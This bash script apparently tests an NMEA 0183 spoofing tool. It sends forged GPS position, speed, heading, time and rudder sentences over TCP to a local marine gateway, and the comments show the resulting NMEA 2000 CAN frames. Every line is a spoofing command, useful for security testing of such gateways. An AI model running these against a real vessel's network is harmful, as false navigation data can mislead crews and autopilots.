#!/bin/bash
### Tests TCP only ###
#can0  18EA4301   [3]  00 EE 00
#can0  18EEFF43   [8]  36 39 A9 59 00 89 32 C0
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPRMC,123519,A,4807.038,N,01131.000,E,0.00,69.0,230394,,,A" --type tcp
# GGA is the only spoofed message that doesn't get converted to NMEA 2K
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPGGA,123456,3723.2475,N,12158.3416,W,1,08,1.0,545.4,M,46.9,M,," --type tcp
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPVTG,134.4,T,,M,10.5,N,19.4,K,A" --type tcp
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPHDT,123.4,T" --type tcp
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPHDG,123.4,0.0,E,3.1,W" --type tcp
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPZDA,201530.00,04,07,2023,," --type tcp
./nmea0183spoofer.py --target 192.168.4.1:1456 --sentence "GPRSA,15.0,A,,V" --type tcp